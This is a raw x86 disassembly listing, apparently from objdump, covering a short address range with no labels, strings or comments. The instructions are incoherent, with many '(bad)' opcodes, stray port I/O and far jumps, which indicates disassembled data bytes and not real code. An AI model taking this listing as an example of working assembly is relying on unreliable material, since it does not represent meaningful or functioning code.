  424492:	add    al,0xaa
  424494:	push   edi
  424495:	or     eax,0x4f5456c8
  42449a:	arpl   WORD PTR [ebp+0x4f],si
  42449d:	popf   
  42449e:	pop    edx
  42449f:	rcl    DWORD PTR [eax-0x2],cl
  4244a2:	cmc    
  4244a3:	nop
  4244a4:	in     eax,dx
  4244a5:	test   eax,0xfe0626fe
  4244aa:	out    dx,al
  4244ab:	and    eax,0xdd100b0b
  4244b0:	(bad)  
  4244b1:	imul   edi,ebx,0x73
  4244b4:	mov    ch,0xe
  4244b6:	repz sbb edi,DWORD PTR [eax-0xdfb4b01]
  4244bd:	(bad)  
  4244be:	jnp    0x424537
  4244c0:	dec    edx
  4244c1:	push   ecx
  4244c2:	adc    al,BYTE PTR [edi-0x13bad6fb]
  4244c8:	inc    edx
  4244c9:	mov    ecx,0xd9b5e0c8
  4244ce:	pop    ecx
  4244cf:	cs mov ebp,0x7e5cddb
  4244d5:	sbb    al,0xb6
  4244d7:	fdivr  DWORD PTR [edi]
  4244d9:	add    DWORD PTR ds:0xbd782f06,esi
  4244df:	sar    dl,1
  4244e1:	(bad)  
  4244e2:	push   cs
  4244e3:	sub    DWORD PTR [ebx+0x53],esi
  4244e6:	xchg   ah,ch
  4244e8:	retf   
  4244e9:	iret   
  4244ea:	xor    eax,0x8df9a1fe
  4244ef:	jns    0x4244de
  4244f1:	pop    ebp
  4244f2:	stos   DWORD PTR es:[edi],eax
  4244f3:	mov    es,esp
  4244f5:	pop    edi
  4244f6:	jp     0x4244a7
  4244f8:	fmul   QWORD PTR [edi]
  4244fa:	clc    
  4244fb:	cld    
  4244fc:	add    al,0x6c
  4244fe:	retf   
  4244ff:	adc    DWORD PTR [edi-0x7e],edi
  424502:	fwait
  424503:	out    dx,eax
  424504:	call   0xc8c0:0xb7abf11a
  42450b:	push   ebx
  42450c:	inc    ecx
  42450d:	stos   BYTE PTR es:[edi],al
  42450e:	mov    ebx,0x2b1b3ddd
  424513:	jg     0x4244f5
  424515:	lods   al,BYTE PTR ds:[esi]
  424516:	push   esi
  424517:	jb     0x42456e
  424519:	sub    DWORD PTR [esi+0xd],edi
  42451c:	or     al,0xaf
  42451e:	add    al,BYTE PTR [ecx-0x3f23e3d6]
  424524:	adc    bl,dl
  424526:	out    dx,al
  424527:	add    cl,ah
  424529:	aam    0xa6
  42452b:	enter  0xc1d9,0x1f
  42452f:	adc    eax,0xae3f896d
  424534:	mov    eax,ds:0x209b863c
  424539:	ficomp WORD PTR [ecx-0x4]
  42453c:	ins    BYTE PTR es:[edi],dx
  42453d:	pop    ss
  42453e:	outs   dx,BYTE PTR ds:[esi]
  42453f:	ret    0x5047
  424542:	ss je  0x42457e
  424545:	cmp    eax,0xe2a9de8e
  42454b:	into   
  42454c:	in     al,dx
  42454d:	rcl    dh,cl
  42454f:	shr    BYTE PTR [esi],0xd7
  424552:	into   
  424553:	lods   eax,DWORD PTR ds:[esi]
  424555:	push   esi
  424556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424557:	sub    DWORD PTR cs:0xbbba179b,esp
  42455e:	xor    ebx,ebp
  424560:	out    dx,eax
  424561:	(bad)  
  424562:	out    0x5c,al
  424564:	or     al,0x17
  424566:	or     DWORD PTR [edi-0x18d2d2e4],0xce29d6ad
  424570:	inc    eax
  424571:	sub    BYTE PTR [edi+0x6e],dh
  424574:	stc    
  424575:	repz dec eax
  424577:	shl    esp,cl
  424579:	jl     0x424511
  42457b:	inc    eax
  42457c:	cwd    
  42457e:	ret    0x22de
  424581:	and    DWORD PTR [edx+0x23967b0f],0x803f26e3
  42458b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42458c:	jnp    0x424566
  42458e:	sbb    BYTE PTR [edi+ebx*2-0xb],al
  424592:	nop
  424593:	in     al,dx
  424594:	push   ss
  424595:	pop    es
  424596:	add    ch,ah
  424598:	xchg   BYTE PTR [ecx-0x64cfc5f6],cl
  42459e:	mov    esp,0xf5060814
  4245a3:	ins    DWORD PTR es:[edi],dx
  4245a4:	dec    edi
  4245a5:	hlt    
  4245a6:	sub    eax,0x5bc369b0
  4245ab:	(bad)  [eax+0x74]
  4245ae:	(bad)  
  4245af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245b0:	popa   
  4245b1:	(bad)  
  4245b2:	pop    ss
  4245b3:	dec    edx
  4245b4:	popf   
  4245b5:	idiv   edi
  4245b7:	cmp    dh,ch
  4245b9:	in     al,dx
  4245ba:	mov    dl,0x91
  4245bc:	jo     0x4245d0
  4245be:	sbb    eax,0x5a08e485
  4245c3:	sub    DWORD PTR [esi+0x26228d74],esi
  4245c9:	shl    BYTE PTR [esi],cl
  4245cb:	jae    0x424559
  4245cd:	icebp  
  4245ce:	jno    0x4245b0
  4245d0:	mov    bl,0x6e
  4245d2:	or     BYTE PTR [edi],0x9
  4245d5:	mov    ah,0x36
  4245d7:	pop    ds
  4245d8:	mov    dh,0xb1
  4245da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245db:	les    edx,FWORD PTR [esi+0x1b6a6683]
  4245e1:	scas   ax,WORD PTR es:[edi]
  4245e3:	pop    ebx
  4245e4:	xor    edi,DWORD PTR [ebp-0x3d]
  4245e7:	jge    0x4245c8
  4245e9:	fsubr  QWORD PTR [esi]
  4245eb:	inc    edi
  4245ec:	and    esp,DWORD PTR [eax-0x243448b1]
  4245f2:	fwait
  4245f3:	dec    ecx
  4245f5:	mov    BYTE PTR [edi+0x3a],ah
  4245f8:	adc    eax,0x69288f92
  4245fd:	adc    al,0xfd
  4245ff:	pop    DWORD PTR [ebx-0x5f51abb7]
  424605:	dec    ebx
  424606:	idiv   bh
  424608:	xchg   edx,eax
  424609:	pop    eax
  42460a:	pop    ecx
  42460b:	stos   BYTE PTR es:[edi],al
  42460c:	sub    esi,DWORD PTR [edi]
  42460e:	pop    esi
  42460f:	int    0x55
  424611:	test   DWORD PTR [ebx-0x27],0x2dd4c567
  424618:	das    
  424619:	adc    al,0xe1
  42461b:	cmp    eax,0xd145bfb2
  424620:	xor    edx,DWORD PTR [ebx+0x50]
  424623:	push   esp
  424624:	push   ds
  424625:	jp     0x4245f8
  424627:	dec    ebp
  424628:	mov    ds:0x8c6a6155,eax
  42462d:	push   cs
  42462e:	js     0x42465c
  424630:	leave  
  424631:	and    al,0x19
  424633:	jp     0x42460a
  424635:	mov    DWORD PTR [edx-0x4e],ebx
  424638:	sbb    al,0x81
  42463a:	mov    BYTE PTR [eax+ecx*2],dh
  42463d:	enter  0xb409,0x23
  424641:	outs   dx,BYTE PTR ds:[esi]
  424642:	data16 test BYTE PTR [bp+si+0x5538],ch
  424648:	mov    al,0xbd
  42464a:	hlt    
  42464b:	push   ss
  42464c:	adc    eax,0xe9dc7093
  424651:	mov    ebx,0xffd3acd5
  424656:	inc    esp
  424657:	push   esi
  424658:	stc    
  424659:	fstp   TBYTE PTR [eax-0x4ded3c5d]
  42465f:	pop    edx
  424660:	in     eax,dx
  424661:	push   ds
  424662:	push   esp
  424663:	sbb    eax,0xac4170f
  424668:	cmp    ebx,esp
  42466a:	fild   WORD PTR [edi+0x14]
  42466d:	xchg   edi,eax
  42466e:	jns    0x4246ac
  424670:	sbb    BYTE PTR [edx-0x58],0x8f
  424674:	or     dl,BYTE PTR [esi-0x37]
  424677:	jmp    0x81e9:0x343c6269
  42467e:	cdq    
  42467f:	mov    ebx,0x8fa49b13
  424684:	inc    ebx
  424685:	cmp    eax,DWORD PTR [ebx+eax*8]
  424688:	les    ebx,FWORD PTR [ecx]
  42468a:	and    DWORD PTR [eax-0x62e963c8],0x79
  424691:	xchg   edx,eax
  424692:	and    eax,0x216daa6d
  424697:	jno    0x4246f2
  424699:	ins    BYTE PTR es:[edi],dx
  42469a:	test   eax,0xd196603d
  42469f:	push   ecx
  4246a0:	mov    ch,0x4d
  4246a2:	retf   0x8049
  4246a5:	push   edx
  4246a6:	stos   BYTE PTR es:[edi],al
  4246a7:	mov    ds:0x2a579a6,eax
  4246ac:	enter  0xef68,0x55
  4246b0:	xor    ch,BYTE PTR [ebp-0x56bc7bb5]
  4246b6:	ret    
  4246b7:	push   esp
  4246b8:	xor    BYTE PTR [esi+ebx*4+0x44],0xa
  4246bd:	jbe    0x4246d2
  4246bf:	jge    0x424733
  4246c1:	call   0xbb225ca
  4246c6:	lds    esi,FWORD PTR [eax+eax*2-0x56]
  4246ca:	aas    
  4246cb:	rol    BYTE PTR [ebx-0x7d806a04],cl
  4246d1:	xor    DWORD PTR [edx],ebx
  4246d3:	sbb    BYTE PTR [esi+0x45],dl
  4246d6:	mov    edx,0x5d2bdba7
  4246db:	out    dx,eax
  4246dc:	test   eax,0xa82ea39a
  4246e1:	sub    al,0x6d
  4246e3:	rcr    BYTE PTR [edx],1
  4246e5:	sbb    BYTE PTR [edi-0x57],0xa5
  4246e9:	fist   WORD PTR [esi+ecx*1-0x291757c5]
  4246f0:	push   ss
  4246f1:	dec    edx
  4246f2:	mov    esi,0x3e696d2a
  4246f7:	pushf  
  4246f8:	cwde   
  4246f9:	adc    ecx,DWORD PTR [ecx-0x4fdf381d]
  4246ff:	rcl    ebx,1
  424701:	jecxz  0x4246ef
  424703:	out    0xea,eax
  424705:	jo     0x42477c
  424707:	jge    0x424726
  424709:	xchg   ebp,eax
  42470a:	inc    ebx
  42470b:	or     eax,0x72b821e5
  424710:	sti    
  424711:	xlat   BYTE PTR ds:[ebx]
  424712:	push   ebp
  424713:	es dec ecx
  424715:	imul   esp,DWORD PTR [esi-0x5440305d],0xffffff99
  42471c:	mov    WORD PTR [edi-0x71dde556],ds
  424722:	xchg   esp,eax
  424723:	leave  
  424724:	sub    edx,esp
  424726:	call   0x57a5:0x2016c6c2
  42472d:	push   ds
  42472e:	dec    ebp
  42472f:	sub    BYTE PTR [ebx-0x7f],cl
  424732:	out    dx,al
  424733:	adc    al,0x51
  424735:	js     0x424714
  424737:	gs iret 
  424739:	pusha  
  42473a:	pop    edx
  42473b:	or     dl,al
  42473d:	retf   
  42473e:	xchg   esi,eax
  42473f:	jmp    0x149a:0x94462d62
  424746:	scas   eax,DWORD PTR es:[edi]
  424747:	or     edi,DWORD PTR [edi]
  424749:	leave  
  42474a:	das    
  42474b:	ins    DWORD PTR es:[edi],dx
  42474c:	sbb    cl,BYTE PTR [eax+0x23996f5]
  424752:	pop    esp
  424753:	jle    0x4247b9
  424755:	in     eax,0x49
  424757:	dec    esp
  424758:	jbe    0x42475f
  42475a:	or     dh,al
  42475c:	es pop ds
  42475e:	jno    0x4247d8
  424760:	mov    dh,0xab
  424762:	cmp    ebx,DWORD PTR [edi+0x15a9932b]
  424768:	gs jp  0x4247e1
  42476b:	ss ss cli 
  42476e:	shl    BYTE PTR [edx],cl
  424770:	mov    edi,0x90b5ff90
  424775:	xor    eax,ebp
  424777:	cmp    dl,BYTE PTR [ebp+edx*2+0x49]
  42477b:	mov    eax,0x6c9e51fc
  424780:	fild   DWORD PTR [ebp+esi*8+0x7f]
  424784:	and    ecx,DWORD PTR [esi+0x3f64df78]
  42478a:	retf   0xe5f6
  42478d:	popa   
  42478e:	ficomp WORD PTR ds:0x6f2ce80a
  424794:	pop    esp
  424795:	call   DWORD PTR [ebx+0x23]
  424798:	pop    edx
  424799:	dec    eax
  42479a:	out    dx,eax
  42479b:	nop
  42479c:	lods   al,BYTE PTR ds:[esi]
  42479d:	add    al,0x53
  42479f:	and    eax,0x811a3e73
  4247a4:	pop    edx
  4247a5:	in     al,0x86
  4247a7:	adc    DWORD PTR [ebx],ecx
  4247a9:	nop
  4247aa:	fstp   QWORD PTR [ebx]
  4247ac:	inc    BYTE PTR [esi-0x67b9913c]
  4247b2:	dec    edi
  4247b3:	push   0xffffffee
  4247b5:	lods   al,BYTE PTR ds:[esi]
  4247b6:	mov    dh,0xda
  4247b8:	push   ds
  4247b9:	ret    
  4247ba:	arpl   WORD PTR [ebp+0x42],cx
  4247bd:	rcr    BYTE PTR [edx+eiz*2],cl
  4247c0:	inc    edx
  4247c1:	xchg   edi,eax
  4247c2:	cld    
  4247c3:	mov    WORD PTR [edx],ds
  4247c5:	and    DWORD PTR [ebx],0xffffff93
  4247c8:	adc    eax,0x7a2b9bd4
  4247cd:	pop    edi
  4247ce:	test   BYTE PTR [edx],ch
  4247d0:	in     al,dx
  4247d1:	pop    ebx
  4247d2:	inc    esi
  4247d3:	loop   0x42477a
  4247d5:	adc    DWORD PTR [ebp-0x3b2a9a5f],eax
  4247db:	fdivr  QWORD PTR [ebx+0x19]
  4247de:	retf   0x915f
  4247e1:	push   0x27bee680
  4247e6:	jo     0x42482d
  4247e8:	shr    eax,cl
  4247ea:	dec    esi
  4247eb:	gs out 0x32,eax
  4247ee:	cmp    DWORD PTR [edi+ebp*2],ecx
  4247f1:	sub    DWORD PTR [eax+0x75],ebp
  4247f4:	fsubr  st(2),st
  4247f6:	clc    
  4247f7:	arpl   dx,di
  4247f9:	lea    ebp,[edi-0x3476cfbf]
  4247ff:	test   al,0x8e
  424801:	loopne 0x4247cb
  424803:	mov    esp,0x2fc5c598
  424808:	mov    eax,ds:0xb844c48d
  42480d:	jmp    0x42c9:0x51441717
  424814:	sbb    al,0xcd
  424816:	dec    eax
  424817:	sub    al,0xfd
  424819:	adc    ecx,DWORD PTR [esi+ecx*4+0x7c]
  42481d:	mov    al,ds:0xbb770052
  424822:	cdq    
  424823:	ds mov al,0xfe
  424826:	add    bh,ah
  424828:	loop   0x424813
  42482a:	cmp    BYTE PTR [ebx+0x56],ah
  42482d:	outs   dx,BYTE PTR ds:[esi]
  42482e:	adc    ah,dl
  424830:	out    0x88,eax
  424832:	cld    
  424833:	mov    eax,ds:0x31b6eed2
  424838:	jle    0x424842
  42483a:	mul    BYTE PTR [ecx-0x2c32bcd2]
  424840:	or     bl,BYTE PTR [edx]
  424842:	fstp   TBYTE PTR [eax-0x1a6631c0]
  424848:	or     al,0x8a
  42484a:	out    dx,al
  42484b:	adc    DWORD PTR [esi],ebx
  42484d:	test   al,0x61
  42484f:	mov    esi,DWORD PTR [ecx+0x3798ea7e]
  424855:	pop    eax
  424856:	or     DWORD PTR [esi+0x466fb55f],ebx
  42485c:	scas   al,BYTE PTR es:[edi]
  42485d:	sbb    BYTE PTR [eax+0x7c],al
  424860:	inc    ecx
  424861:	add    BYTE PTR [ebp-0x7f5caa81],0x3
  424868:	push   edx
  424869:	cdq    
  42486a:	rcl    bh,cl
  42486c:	jnp    0x4248c6
  42486e:	(bad)  
  42486f:	mov    ebx,0x8f766285
  424874:	mov    cl,0x44
  424876:	in     al,dx
  424877:	cmp    al,0x87
  424879:	and    al,0xb1
  42487b:	jge    0x424820
  42487d:	test   DWORD PTR [ebp+0x7a65f2d4],edx
  424883:	mov    ds:0x89ad9dcd,al
  424888:	push   cs
  424889:	popa   
  42488a:	fist   DWORD PTR [ebx]
  42488c:	imul   eax,esp,0xa
  42488f:	shl    DWORD PTR [edx],1
  424891:	(bad)  
  424893:	or     cl,BYTE PTR [eax+esi*1]
  424896:	mov    dh,0x62
  424898:	fmul   QWORD PTR [ebp-0x4e03d22f]
  42489e:	inc    esp
  42489f:	pop    ss
  4248a0:	jp     0x424839
  4248a2:	mov    ebx,0xeecbbd7c
  4248a7:	and    edx,ecx
  4248a9:	popf   
  4248aa:	std    
  4248ab:	fisttp WORD PTR [esi+edi*4]
  4248ae:	das    
  4248af:	stos   BYTE PTR es:[edi],al
  4248b0:	mov    eax,0x565d46e0
  4248b5:	inc    esi
  4248b6:	dec    ebx
  4248b7:	sahf   
  4248b8:	jg     0x4248ef
  4248ba:	out    dx,eax
  4248bb:	add    eax,0xb22484f
  4248c0:	push   es
  4248c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248c2:	cwde   
  4248c3:	and    DWORD PTR [ecx+0x5a],esp
  4248c6:	adc    dl,BYTE PTR [edi]
  4248c8:	call   0x92345e61
  4248cd:	in     eax,dx
  4248ce:	add    eax,DWORD PTR [edx]
  4248d0:	mov    edi,0x69c01910
  4248d5:	pop    edx
  4248d6:	iret   
  4248d7:	mov    dl,0xdb
  4248d9:	(bad)  
  4248da:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4248dc:	and    edx,DWORD PTR ds:0x1dee5e76
  4248e2:	ins    DWORD PTR es:[edi],dx
  4248e3:	push   edi
  4248e4:	test   bl,dl
  4248e6:	cmp    edi,DWORD PTR [eax-0xbae885f]
  4248ec:	call   0x3c13:0xbfba83e3
  4248f3:	das    
  4248f4:	inc    ebx
  4248f5:	and    dl,BYTE PTR [ebx-0x4d93a751]
  4248fb:	outs   dx,DWORD PTR ds:[esi]
  4248fc:	mov    al,0xdd
  4248fe:	xor    eax,0x8b1d15b4
  424903:	test   eax,0x9ec03a9d
  424908:	dec    esp
  424909:	sbb    BYTE PTR [ebx-0x24],bh
  42490c:	mov    ebx,0x122029fb
  424911:	xor    BYTE PTR [esi],0xf0
  424914:	sbb    DWORD PTR [edi+eax*1],edi
  424917:	mov    ch,0x0
  424919:	sub    eax,0x37ccb7a7
  42491e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42491f:	in     eax,dx
  424920:	adc    al,BYTE PTR [ebp+eax*8-0x10705746]
  424927:	mov    al,0x98
  424929:	(bad)  
  42492a:	lods   eax,DWORD PTR ds:[esi]
  42492b:	inc    edi
  42492c:	mov    al,ch
  42492e:	mov    dh,0x97
  424930:	jmp    0x8975:0x9519278
  424937:	sub    edi,esp
  424939:	fsub   DWORD PTR [ebx+ecx*8+0x5d]
  42493d:	mov    ah,0x5
  42493f:	mov    cs,WORD PTR ds:[ebp+0x2d]
  424943:	cli    
  424944:	sub    DWORD PTR [edi],ebp
  424946:	cmp    eax,0x6049d891
  42494b:	and    ebx,DWORD PTR [ebx+0x1e]
  42494e:	sub    al,0x66
  424950:	jle    0x42498b
  424952:	mov    ah,0xef
  424954:	mov    ds:0x46cbb5b,al
  424959:	pop    edi
  42495a:	daa    
  42495b:	mov    edx,cs
  42495d:	sub    BYTE PTR [ebx-0x4923de4d],al
  424963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424964:	or     DWORD PTR ds:0xd80da105,0x20
  42496b:	and    DWORD PTR [edx+0xd852523],0xb82458c4
  424975:	mov    dh,0xe
  424977:	int3   
  424978:	scas   eax,DWORD PTR es:[edi]
  424979:	cmp    DWORD PTR [edx+0x0],edi
  42497c:	stos   DWORD PTR es:[edi],eax
  42497d:	stos   BYTE PTR es:[edi],al
  42497e:	jbe    0x4249bf
  424980:	enter  0x99fb,0x77
  424984:	in     al,dx
  424985:	adc    DWORD PTR ds:0x10e40565,esi
  42498b:	repz xchg ebx,eax
  42498d:	push   esi
  42498e:	clc    
  42498f:	add    eax,esp
  424991:	jg     0x424922
  424993:	fiadd  WORD PTR [ebp+0x56c11f4d]
  424999:	jg     0x4249fa
  42499b:	cdq    
  42499c:	adc    DWORD PTR [esi],ebx
  42499e:	nop
  42499f:	gs (bad) 
  4249a1:	int    0xa2
  4249a3:	rol    BYTE PTR [esi],0x47
  4249a6:	cs test eax,0x40ff5c32
  4249ac:	in     al,dx
  4249ad:	js     0x4249cf
  4249af:	push   0xffffffef
  4249b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249b2:	mov    cl,BYTE PTR [edi]
  4249b4:	stos   BYTE PTR es:[edi],al
  4249b5:	mov    BYTE PTR ds:0x65fa8fe9,ch
  4249bb:	cdq    
  4249bc:	push   ds
  4249bd:	into   
  4249be:	stos   BYTE PTR es:[edi],al
  4249bf:	(bad)  
  4249c1:	jns    0x424995
  4249c3:	push   esp
  4249c4:	sbb    eax,eax
  4249c6:	shr    BYTE PTR [ebx+0x5c],0xf2
  4249ca:	add    BYTE PTR [ebp-0x5b],bh
  4249cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4249ce:	ja     0x4249f0
  4249d0:	jne    0x4249b0
  4249d2:	xor    BYTE PTR [edi+0x73],bl
  4249d5:	in     al,dx
  4249d6:	test   BYTE PTR [edx+ecx*2-0x655dfafd],al
  4249dd:	mov    DWORD PTR [ebx-0x2a],0x24ce6ccc
  4249e4:	imul   ebx,esp,0xffffffd3
  4249e7:	rcl    BYTE PTR ds:0xc371ee0b,1
  4249ed:	jnp    0x424980
  4249ef:	out    0x8a,eax
  4249f1:	and    BYTE PTR [edi],bl
  4249f3:	inc    eax
  4249f4:	push   DWORD PTR [ecx-0x25]
  4249f7:	fstp   QWORD PTR [edx+0x641ed81f]
  4249fd:	sbb    cl,BYTE PTR [esi+0x39]
  424a00:	(bad)  
  424a01:	push   ecx
  424a02:	cmp    ecx,edx
  424a04:	cmp    BYTE PTR [esi-0x7360f23e],dh
  424a0a:	jp     0x4249be
  424a0c:	fisubr WORD PTR [edx+ebx*2-0x66bbf692]
  424a13:	xchg   ebp,eax
  424a14:	les    ebx,FWORD PTR [ebp+esi*1+0x55]
  424a18:	add    ebp,DWORD PTR [ebx+0x14fb763f]
  424a1e:	xchg   BYTE PTR [esp+ecx*2-0x299d4578],al
  424a25:	enter  0x5578,0xcf
  424a29:	mov    ebx,0x43cf7e7
  424a2e:	dec    ebp
  424a2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a30:	ss or  ah,cl
  424a33:	scas   al,BYTE PTR es:[edi]
  424a34:	je     0x424a8b
  424a36:	mov    ds:0x1f2eee8,eax
  424a3b:	scas   al,BYTE PTR es:[edi]
  424a3c:	push   esi
  424a3d:	push   esi
  424a3e:	adc    esp,DWORD PTR [esi+0x1c]
  424a41:	jmp    0x424a72
  424a43:	sar    DWORD PTR [edi],cl
  424a45:	(bad)  
  424a46:	ins    BYTE PTR es:[edi],dx
  424a47:	dec    ecx
  424a48:	and    BYTE PTR [ebx],bl
  424a4a:	dec    ecx
  424a4b:	jg     0x424a1e
  424a4d:	mov    ebx,0x2baa066a
  424a52:	mov    edi,DWORD PTR [ebx+0x6589edd2]
  424a58:	dec    ebp
  424a59:	(bad)  
  424a5b:	or     al,0x52
  424a5d:	adc    eax,0xd0324296
  424a62:	mov    edx,0x53
  424a67:	add    BYTE PTR [eax],al
  424a69:	add    BYTE PTR [edx+0x41],dl
  424a6c:	push   esp
  424a6d:	push   edx
  424a6e:	push   edi
  424a6f:	push   edi
  424a70:	push   esi
  424a71:	inc    ecx
  424a72:	ror    DWORD PTR [ebx-0x49],1
  424a75:	popf   
  424a76:	std    
  424a77:	pusha  
  424a78:	mov    WORD PTR [esp+ebp*2],gs
  424a7b:	fadd   DWORD PTR [ecx]
  424a7d:	add    BYTE PTR [edx-0x60fffffa],al
  424a83:	xor    cl,BYTE PTR [esi+0x64]
  424a86:	ret    
  424a87:	and    BYTE PTR [ebp+0x36661681],ch
  424a8d:	nop
  424a8e:	mov    ds:0xd8ebd1a1,eax
  424a93:	test   DWORD PTR [edi+0x31],ecx
  424a96:	popa   
  424a97:	lea    esp,ds:0x157ca1d8
  424a9d:	or     BYTE PTR [ebx-0x6f],ah
  424aa0:	dec    ecx
  424aa1:	push   0xffffff8f
  424aa3:	rcr    ch,1
  424aa5:	cmp    DWORD PTR [ebx],eax
  424aa7:	jae    0x424ae1
  424aa9:	inc    esi
  424aaa:	mov    ds:0xdecc8ca4,eax
  424aaf:	inc    eax
  424ab0:	je     0x424a3a
  424ab2:	or     al,0xfc
  424ab4:	mov    ds:0xd57aa010,al
  424ab9:	mov    ds:0xbb8dc033,eax
  424abe:	push   esp
  424abf:	loop   0x424aa3
  424ac1:	sbb    eax,0xe5b60a2e
  424ac6:	add    esi,DWORD PTR [eax+ebx*4+0x7f]
  424aca:	(bad)  
  424acb:	mov    esi,0x2b235975
  424ad0:	pop    es
  424ad1:	aaa    
  424ad2:	mov    eax,0xdfa32a6e
  424ad7:	dec    eax
  424ad8:	inc    edi
  424ad9:	ins    DWORD PTR es:[edi],dx
  424ada:	neg    DWORD PTR [ebx]
  424adc:	aaa    
  424add:	or     BYTE PTR [edi+0x62],dh
  424ae0:	aaa    
  424ae1:	stos   BYTE PTR es:[edi],al
  424ae2:	pop    ebx
  424ae3:	add    DWORD PTR gs:[ecx-0x37],esp
  424ae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ae8:	ss xchg esp,eax
  424aea:	jo     0x424aff
  424aec:	jmp    0x1561f462
  424af1:	mov    esp,0x421cec46
  424af6:	xor    ecx,DWORD PTR [edx+edi*8-0x6bed6520]
  424afd:	push   0xcea5dab3
  424b02:	shl    ebp,0x82
  424b05:	ret    0xf055
  424b08:	xchg   ecx,eax
  424b09:	or     esi,edx
  424b0b:	xor    esi,ebx
  424b0d:	sub    al,0x82
  424b0f:	(bad)  
  424b11:	adc    al,BYTE PTR ds:0xedfdba42
  424b17:	xchg   ebp,eax
  424b18:	mov    ds:0x2748d2ce,eax
  424b1d:	(bad)  
  424b1f:	jbe    0x424ae0
  424b21:	aad    0xd7
  424b23:	mov    al,ds:0x49f5676a
  424b28:	sub    eax,0xcd24f8fc
  424b2d:	sub    DWORD PTR [edi],ebx
  424b2f:	pop    ecx
  424b30:	div    DWORD PTR [eax-0x3f]
  424b33:	aaa    
  424b34:	xor    BYTE PTR [ebx-0x2cf913a3],al
  424b3a:	cdq    
  424b3b:	push   edx
  424b3c:	ja     0x424b98
  424b3e:	xor    BYTE PTR ds:0x3eb9d46,ch
  424b44:	ins    BYTE PTR es:[edi],dx
  424b45:	add    bl,BYTE PTR [esi-0x6a3ad82f]
  424b4b:	mov    bl,0xd2
  424b4d:	sbb    BYTE PTR [eax],bl
  424b4f:	sbb    esi,edi
  424b51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b52:	push   0xffffffd2
  424b54:	mov    esp,DWORD PTR [edi]
  424b56:	adc    al,0x44
  424b58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b59:	mov    eax,ds:0xddfd3eb
  424b5e:	inc    ebx
  424b5f:	adc    eax,DWORD PTR [ebx-0x2]
  424b62:	sub    BYTE PTR [ebp-0x7cf28c42],ch
  424b68:	call   0xa7fd56a5
  424b6d:	test   eax,0x6c2e08ed
  424b72:	push   edi
  424b73:	mov    WORD PTR [edi],?
  424b75:	mov    ebp,0x3c101a64
  424b7a:	nop
  424b7b:	jmp    0xe50b7901
  424b80:	xor    BYTE PTR [ebp+0x75],ah
  424b83:	adc    BYTE PTR [ebx],cl
  424b85:	div    DWORD PTR [ebp-0x28]
  424b88:	fisttp WORD PTR [edx+0x11]
  424b8b:	fistp  DWORD PTR [ebx+0x2c]
  424b8e:	inc    ecx
  424b8f:	xchg   ebp,eax
  424b90:	push   ebp
  424b91:	jg     0x424be0
  424b93:	leave  
  424b94:	sub    DWORD PTR [eax],esp
  424b96:	sub    DWORD PTR [esi],0x67
  424b99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b9a:	mov    ch,0x3f
  424b9c:	lods   al,BYTE PTR ds:[esi]
  424b9d:	rcl    BYTE PTR [ebp+0x13],0x43
  424ba1:	fsub   QWORD PTR [ebx-0x737460f8]
  424ba7:	pop    edi
  424ba8:	push   ss
  424ba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424baa:	int    0xe1
  424bac:	jp     0x424b79
  424bae:	adc    edx,DWORD PTR [edx+ebp*2]
  424bb1:	call   0xebe8:0xfc0a13ff
  424bb8:	dec    ebx
  424bb9:	cmp    eax,0xa528494
  424bbe:	xor    al,0x7d
  424bc0:	outs   dx,BYTE PTR ds:[esi]
  424bc1:	cld    
  424bc2:	imul   esp,DWORD PTR [eax],0xedda41fd
  424bc8:	push   edx
  424bc9:	retf   
  424bca:	mov    al,bl
  424bcc:	or     DWORD PTR [edx],edx
  424bce:	sbb    eax,0x860d0d37
  424bd3:	pop    esi
  424bd4:	imul   esi,DWORD PTR [edx+ecx*8],0xffffffbb
  424bd8:	ret    0x688c
  424bdb:	int3   
  424bdc:	icebp  
  424bdd:	jo     0x424b7e
  424bdf:	sub    al,0xd9
  424be1:	loopne 0x424c55
  424be3:	lods   eax,DWORD PTR ds:[esi]
  424be4:	repnz outs dx,BYTE PTR ds:[esi]
  424be6:	(bad)  
  424be7:	adc    dl,BYTE PTR [edi]
  424be9:	test   al,0x45
  424beb:	dec    edx
  424bec:	cmc    
  424bed:	xchg   edi,edi
  424bef:	mov    BYTE PTR [eax+0x71],0x25
  424bf3:	cdq    
  424bf4:	mov    esi,0x2a5c5953
  424bf9:	gs mov ecx,0xd0aec4f9
  424bff:	dec    ebx
  424c00:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  424c02:	mov    DWORD PTR [ebp-0x3d38f78c],ebx
  424c08:	neg    BYTE PTR [ecx]
  424c0a:	cwde   
  424c0b:	ds jmp 0x424bbe
  424c0e:	push   gs
  424c10:	in     eax,0x56
  424c12:	out    0x58,al
  424c14:	mov    ds:0x51f2428b,eax
  424c19:	xchg   edi,eax
  424c1a:	fwait
  424c1b:	imul   edx,DWORD PTR [eax],0x23e833c5
  424c21:	inc    edx
  424c22:	rcl    ch,1
  424c24:	sahf   
  424c25:	ja     0x424bf6
  424c27:	ss enter 0x48e8,0xd1
  424c2c:	addr16 push eax
  424c2e:	loopne 0x424c3f
  424c30:	sbb    eax,DWORD PTR [esi]
  424c32:	and    BYTE PTR [eax+ebx*1+0x138d1cd7],bh
  424c39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c3a:	pop    esi
  424c3b:	imul   edx,ebx,0xffffffab
  424c3e:	ss push 0x94aca6dd
  424c44:	and    DWORD PTR [edx],0x5a3b9101
  424c4a:	dec    ecx
  424c4b:	cmp    dl,BYTE PTR [edi]
  424c4d:	cwde   
